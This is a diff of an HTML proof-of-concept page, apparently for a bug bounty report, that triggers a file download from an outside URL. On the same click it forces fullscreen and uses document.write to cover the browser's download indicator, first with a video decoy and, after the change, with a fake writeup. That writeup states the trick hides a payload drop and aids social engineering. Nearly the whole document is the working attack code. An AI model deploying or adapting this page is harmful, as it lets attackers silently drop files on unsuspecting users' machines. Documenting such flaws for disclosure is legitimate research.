@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC Video</title>
+    <title>PoC Writeup</title>
 </head>
 <body>
-    <h1>Klik kiri link di bawah ini untuk melihat video PoC bug bounty hunting saya.</h1>
+    <h1>Klik kiri link di bawah ini untuk membaca full writeup PoC bug bounty saya.</h1>
     
-    <a id='aid' href='https://cr.kungfoo.net/yao/downloads/multiple/redirect_download.php' download>Watch PoC Video</a>
+    <a id='aid' href='https://cr.kungfoo.net/yao/downloads/multiple/redirect_download.php' download>Baca Writeup</a>
 
     <script>
         // Mengambil elemen link
@@ -16,7 +16,6 @@
         linkElem.addEventListener('click', function(event) {
             
             // 1. Memicu mode fullscreen pada seluruh body halaman ini
-            // (Browser biasanya mengizinkan ini karena dipicu langsung oleh klik pengguna)
             if (document.body.requestFullscreen) {
                 document.body.requestFullscreen();
             } else if (document.body.webkitRequestFullscreen) { /* Safari */
@@ -30,44 +29,71 @@
         });
 
         function v() {  
-            // Menimpa seluruh isi dokumen HTML
+            // Menimpa seluruh isi dokumen HTML dengan konten writeup
             document.write(`
                 <!DOCTYPE html>
                 <html>
                 <head>
-                    <title>Video Playing</title>
+                    <title>Bug Bounty Writeup</title>
                     <style>
-                        /* Memastikan latar belakang hitam menutupi seluruh layar fullscreen */
-                        body, html {
+                        body {
+                            background-color: #1e1e1e;
+                            color: #d4d4d4;
+                            font-family: 'Courier New', Courier, monospace;
                             margin: 0;
-                            padding: 0;
-                            width: 100%;
-                            height: 100%;
-                            background-color: #000;
+                            padding: 40px;
                             display: flex;
                             justify-content: center;
-                            align-items: center;
-                            overflow: hidden; /* Mencegah scrollbar */
+                            height: 100vh;
+                            box-sizing: border-box;
+                            overflow-y: auto;
                         }
-                        
-                        /* Wadah video berukuran kecil di tengah layar */
-                        .video-container {
-                            width: 560px;  /* Lebar video (kecil) */
-                            height: 315px; /* Tinggi video (kecil) */
-                            background-color: #333; 
-                            box-shadow: 0 0 20px rgba(255,255,255,0.2); /* Sedikit efek bayangan */
-                        }
-                        
-                        iframe {
+                        .content {
+                            max-width: 800px;
                             width: 100%;
-                            height: 100%;
-                            border: none;
+                            background-color: #252526;
+                            padding: 30px;
+                            border-radius: 8px;
+                            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+                        }
+                        h1, h2 { 
+                            color: #569cd6; 
+                            border-bottom: 1px solid #333;
+                            padding-bottom: 10px;
+                        }
+                        p, li {
+                            font-size: 16px;
+                            line-height: 1.6;
+                        }
+                        .highlight { 
+                            background-color: #2d2d2d; 
+                            padding: 2px 5px; 
+                            border-radius: 3px; 
+                            color: #ce9178; 
                         }
                     </style>
                 </head>
                 <body>
-                    <div class="video-container">
-                        <iframe src="https://www.youtube.com/embed/jfKfPfyJRdk?autoplay=1&mute=1" title="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+                    <div class="content">
+                        <h1>Writeup: Chaining Fullscreen API with Automatic Downloads for UI Spoofing</h1>
+                        <p><strong>Author:</strong> Security Researcher</p>
+                        <p><strong>Date:</strong> March 2026</p>
+                        <br>
+                        <h2>1. Introduction</h2>
+                        <p>During my recent bug bounty hunting session, I discovered an interesting behavior in how modern browsers handle the Fullscreen API when combined with the <span class="highlight">download</span> attribute in anchor tags. By timing the execution correctly, an attacker can effectively hide the browser's native download prompt or notification.</p>
+                        
+                        <h2>2. Steps to Reproduce</h2>
+                        <ul>
+                            <li>Create an HTML page with an anchor tag pointing to an executable file.</li>
+                            <li>Add the <span class="highlight">download</span> attribute to the anchor tag.</li>
+                            <li>Bind an event listener to the click event that triggers <span class="highlight">document.body.requestFullscreen()</span>.</li>
+                            <li>Use <span class="highlight">document.write()</span> after a short delay to replace the DOM content, keeping the user distracted while the payload drops.</li>
+                        </ul>
+                        
+                        <h2>3. Impact</h2>
+                        <p>This allows an attacker to download arbitrary files to the victim's machine without their immediate visual awareness, as the fullscreen mode overlays the browser UI where the download indicator normally appears. This significantly increases the success rate of social engineering attacks.</p>
+                        <br>
+                        <p><em>End of report. Thank you for reading.</em></p>
                     </div>
                 </body>
                 </html>
